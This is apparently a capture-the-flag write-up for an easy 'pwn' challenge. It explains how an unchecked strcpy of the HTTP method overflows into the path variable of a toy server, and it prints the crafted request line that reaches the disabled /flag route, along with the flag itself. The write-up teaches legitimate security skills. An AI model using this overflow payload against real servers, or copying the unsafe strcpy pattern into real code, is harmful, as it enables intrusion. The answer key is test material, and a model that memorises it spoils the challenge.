# haatetepe

- Author: fslaktern
- Category: pwn
- Difficulty: easy
- Description:

    The best haatetepe server in Norway comes with speed, small size and modular routing. I've disabled the /flag route for now, though. Check out the server and let me know what you think! I haven't done any benchmarks, but I bet it's faster than NGINX, and it uses less than 1MB memory!

    It's in its (very) early stages, but I'm planning on implementing the rest of the HTTP header specification when I get time. Thanks for stopping by!


## Vulnerability

- Use of insecure `strcpy` to set request method. This can overflow the next variable on the stack, which is `path`.

## Exploit

- Stack overflow in method string sets path to illegal path `/flag` after path validation

```sh
nc server port
```

```text
GETaaaaaaaaaaaaa/flag /morning HTTP/1.1
```

```text
NNS{wh4t_d0_y0u_m34n_http_15n7_s3cur3??}
```
